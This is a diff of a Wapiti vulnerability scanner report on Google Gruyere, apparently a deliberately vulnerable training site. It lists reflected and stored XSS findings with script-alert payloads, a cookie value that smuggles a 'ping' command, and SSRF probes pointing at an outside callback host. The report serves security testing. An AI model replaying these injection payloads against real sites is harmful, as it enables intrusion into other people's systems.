@@ -451,7 +451,7 @@
         "parameter": "",
         "referer": "",
         "module": "csp",
-        "http_request": "GET /481794057459442987145926499918218457249/ HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=88600095|https://wapiti3.ovh/ssrf/6ruqhg/10/756964/||author",
+        "http_request": "GET /481794057459442987145926499918218457249/ HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=101360611|w1uejuwxjq||author",
         "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/\"",
         "wstg": [
           "WSTG-CONF-12",
@@ -476,7 +476,7 @@
         "parameter": "",
         "referer": "",
         "module": "http_headers",
-        "http_request": "GET /481794057459442987145926499918218457249/ HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=34769421|&ping -n 25 127.0.0.1&||author",
+        "http_request": "GET /481794057459442987145926499918218457249/ HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=34468160|https://wapiti3.ovh/ssrf/gedzci/16/756964/||author",
         "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/\"",
         "wstg": [
           "OSHP-X-Frame-Options"
@@ -492,7 +492,7 @@
         "parameter": "",
         "referer": "",
         "module": "http_headers",
-        "http_request": "GET /481794057459442987145926499918218457249/ HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=34769421|&ping -n 25 127.0.0.1&||author",
+        "http_request": "GET /481794057459442987145926499918218457249/ HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=34468160|https://wapiti3.ovh/ssrf/gedzci/16/756964/||author",
         "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/\"",
         "wstg": [
           "WSTG-CONF-07",
@@ -509,7 +509,7 @@
         "parameter": "",
         "referer": "",
         "module": "http_headers",
-        "http_request": "GET /481794057459442987145926499918218457249/ HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=34769421|&ping -n 25 127.0.0.1&||author",
+        "http_request": "GET /481794057459442987145926499918218457249/ HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=34468160|https://wapiti3.ovh/ssrf/gedzci/16/756964/||author",
         "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/\"",
         "wstg": [
           "OSHP-X-Content-Type-Options"
@@ -545,8 +545,22 @@
         "parameter": "uid",
         "referer": "",
         "module": "xss",
-        "http_request": "GET /481794057459442987145926499918218457249/snippets.gtl?uid=%3CScRiPt%3Ealert%28%27wwfl6dpyy9%27%29%3C%2FsCrIpT%3E HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=90842025|w90r57ovmk||author",
-        "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/snippets.gtl?uid=%3CScRiPt%3Ealert%28%27wwfl6dpyy9%27%29%3C%2FsCrIpT%3E\"",
+        "http_request": "GET /481794057459442987145926499918218457249/snippets.gtl?uid=%3CScRiPt%3Ealert%28%27wsofb1bdjp%27%29%3C%2FsCrIpT%3E HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=101360611|w1uejuwxjq||author",
+        "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/snippets.gtl?uid=%3CScRiPt%3Ealert%28%27wsofb1bdjp%27%29%3C%2FsCrIpT%3E\"",
+        "wstg": [
+          "WSTG-INPV-01"
+        ]
+      },
+      {
+        "method": "POST",
+        "path": "/481794057459442987145926499918218457249/upload2",
+        "info": "Reflected Cross Site Scripting vulnerability found via injection in the parameter upload_file",
+        "level": 2,
+        "parameter": "upload_file",
+        "referer": "https://google-gruyere.appspot.com/481794057459442987145926499918218457249/upload.gtl",
+        "module": "xss",
+        "http_request": "POST /481794057459442987145926499918218457249/upload2 HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nreferer: https://google-gruyere.appspot.com/481794057459442987145926499918218457249/upload.gtl\ncookie: GRUYERE=101360611|w1uejuwxjq||author\ncontent-length: 210\ncontent-type: multipart/form-data; boundary=9fb2afa2ab7019ed6539411e83e5f1ef\nContent-Type: multipart/form-data; boundary=------------------------boundarystring\n\n------------------------boundarystring\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"<ScRiPt>alert('wvw7b512dj')</sCrIpT>\"\n\nGIF89a\n------------------------boundarystring--",
+        "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/upload2\" -e \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/upload.gtl\" -F \"upload_file=@your_local_file;filename=<ScRiPt>alert('wvw7b512dj')</sCrIpT>\"",
         "wstg": [
           "WSTG-INPV-01"
         ]
@@ -573,7 +587,64 @@
     "TLS/SSL misconfigurations": [],
     "Server Side Request Forgery": [],
     "Stored HTML Injection": [],
-    "Stored Cross Site Scripting": [],
+    "Stored Cross Site Scripting": [
+      {
+        "method": "GET",
+        "path": "/481794057459442987145926499918218457249/saveprofile",
+        "info": "Stored Cross Site Scripting vulnerability found in https://google-gruyere.appspot.com/481794057459442987145926499918218457249/ by injecting the parameter uid of https://google-gruyere.appspot.com/481794057459442987145926499918218457249/saveprofile",
+        "level": 3,
+        "parameter": "uid",
+        "referer": "https://google-gruyere.appspot.com/481794057459442987145926499918218457249/newaccount.gtl",
+        "module": "permanentxss",
+        "http_request": "GET /481794057459442987145926499918218457249/saveprofile?action=new&uid=%3CScRiPt%3Ealert%28%27w1uejuwxjq%27%29%3C%2FsCrIpT%3E&pw=Letm3in_&is_author=True HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=101360611|w1uejuwxjq||author",
+        "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/saveprofile?action=new&uid=%3CScRiPt%3Ealert%28%27w1uejuwxjq%27%29%3C%2FsCrIpT%3E&pw=Letm3in_&is_author=True\" -e \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/newaccount.gtl\"",
+        "wstg": [
+          "WSTG-INPV-02"
+        ]
+      },
+      {
+        "method": "GET",
+        "path": "/481794057459442987145926499918218457249/saveprofile",
+        "info": "Stored Cross Site Scripting vulnerability found in https://google-gruyere.appspot.com/481794057459442987145926499918218457249/default by injecting the parameter uid of https://google-gruyere.appspot.com/481794057459442987145926499918218457249/saveprofile",
+        "level": 3,
+        "parameter": "uid",
+        "referer": "https://google-gruyere.appspot.com/481794057459442987145926499918218457249/newaccount.gtl",
+        "module": "permanentxss",
+        "http_request": "GET /481794057459442987145926499918218457249/saveprofile?action=new&uid=%3C%2Fscript%3E%3CScRiPt%3Ealert%28%27w1uejuwxjq%27%29%3C%2FsCrIpT%3E&pw=Letm3in_&is_author=True HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=19653941|<ScRiPt>alert('w1uejuwxjq')</sCrIpT>||author",
+        "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/saveprofile?action=new&uid=%3C%2Fscript%3E%3CScRiPt%3Ealert%28%27w1uejuwxjq%27%29%3C%2FsCrIpT%3E&pw=Letm3in_&is_author=True\" -e \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/newaccount.gtl\"",
+        "wstg": [
+          "WSTG-INPV-02"
+        ]
+      },
+      {
+        "method": "GET",
+        "path": "/481794057459442987145926499918218457249/saveprofile",
+        "info": "Stored Cross Site Scripting vulnerability found in https://google-gruyere.appspot.com/481794057459442987145926499918218457249/editprofile.gtl by injecting the parameter uid of https://google-gruyere.appspot.com/481794057459442987145926499918218457249/saveprofile",
+        "level": 3,
+        "parameter": "uid",
+        "referer": "https://google-gruyere.appspot.com/481794057459442987145926499918218457249/newaccount.gtl",
+        "module": "permanentxss",
+        "http_request": "GET /481794057459442987145926499918218457249/saveprofile?action=new&uid=%3C%2Fscript%3E%3CScRiPt%3Ealert%28%27w1uejuwxjq%27%29%3C%2FsCrIpT%3E&pw=Letm3in_&is_author=True HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=84160278|</script><ScRiPt>alert('w1uejuwxjq')</sCrIpT>||author",
+        "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/saveprofile?action=new&uid=%3C%2Fscript%3E%3CScRiPt%3Ealert%28%27w1uejuwxjq%27%29%3C%2FsCrIpT%3E&pw=Letm3in_&is_author=True\" -e \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/newaccount.gtl\"",
+        "wstg": [
+          "WSTG-INPV-02"
+        ]
+      },
+      {
+        "method": "GET",
+        "path": "/481794057459442987145926499918218457249/saveprofile",
+        "info": "Stored Cross Site Scripting vulnerability found in https://google-gruyere.appspot.com/481794057459442987145926499918218457249/login by injecting the parameter uid of https://google-gruyere.appspot.com/481794057459442987145926499918218457249/saveprofile",
+        "level": 3,
+        "parameter": "uid",
+        "referer": "https://google-gruyere.appspot.com/481794057459442987145926499918218457249/newaccount.gtl",
+        "module": "permanentxss",
+        "http_request": "GET /481794057459442987145926499918218457249/saveprofile?action=new&uid=%3C%2Fscript%3E%3CScRiPt%3Ealert%28%27w1uejuwxjq%27%29%3C%2FsCrIpT%3E&pw=Letm3in_&is_author=True HTTP/1.1\nhost: google-gruyere.appspot.com\nconnection: keep-alive\nuser-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0\naccept-language: en-US\naccept-encoding: gzip, deflate, br\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\ncookie: GRUYERE=84160278|</script><ScRiPt>alert('w1uejuwxjq')</sCrIpT>||author",
+        "curl_command": "curl \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/saveprofile?action=new&uid=%3C%2Fscript%3E%3CScRiPt%3Ealert%28%27w1uejuwxjq%27%29%3C%2FsCrIpT%3E&pw=Letm3in_&is_author=True\" -e \"https://google-gruyere.appspot.com/481794057459442987145926499918218457249/newaccount.gtl\"",
+        "wstg": [
+          "WSTG-INPV-02"
+        ]
+      }
+    ],
     "Subdomain takeover": [],
     "Blind SQL Injection": [],
     "Unrestricted File Upload": [],
@@ -591,11 +662,11 @@
   },
   "infos": {
     "target": "https://google-gruyere.appspot.com/481794057459442987145926499918218457249/",
-    "date": "Wed, 07 May 2025 13:03:15 +0000",
+    "date": "Thu, 22 May 2025 13:44:25 +0000",
     "version": "Wapiti 3.2.4",
-    "scope": "folder",
+    "scope": "domain",
     "auth": null,
-    "crawled_pages_nbr": 10,
+    "crawled_pages_nbr": 27,
     "detailed_report_level": 0
   }
 }
